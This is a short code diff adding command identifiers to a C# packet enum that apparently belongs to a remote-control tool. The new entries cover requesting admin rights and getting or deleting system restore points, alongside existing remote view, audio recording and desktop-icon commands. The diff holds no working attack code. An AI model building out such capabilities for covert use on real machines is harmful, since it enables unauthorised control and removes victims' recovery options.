@@ -63,6 +63,7 @@ namespace PacketLib.Packet
         MISC_HIDE_DESKTOP_ICONS =       49,
         MISC_SHOW_DESKTOP_ICONS =       50,
         MISC_SCREEN_ROTATION =          61,
+        MISC_ASK_ADMIN_RIGHTS =         67,
 
         RM_VIEW_ON =                    34,
         RM_VIEW_OFF =                   35,
@@ -86,6 +87,9 @@ namespace PacketLib.Packet
         AUDIO_RECORD_OFF =              57,
 
         CHAT_ON =                       62,
-        CHAT_OFF =                      63
+        CHAT_OFF =                      63,
+
+        UAC_GET_RESTORE_POINT =         68,
+        UAC_DELETE_RESTORE_POINT =      69
     }
 }
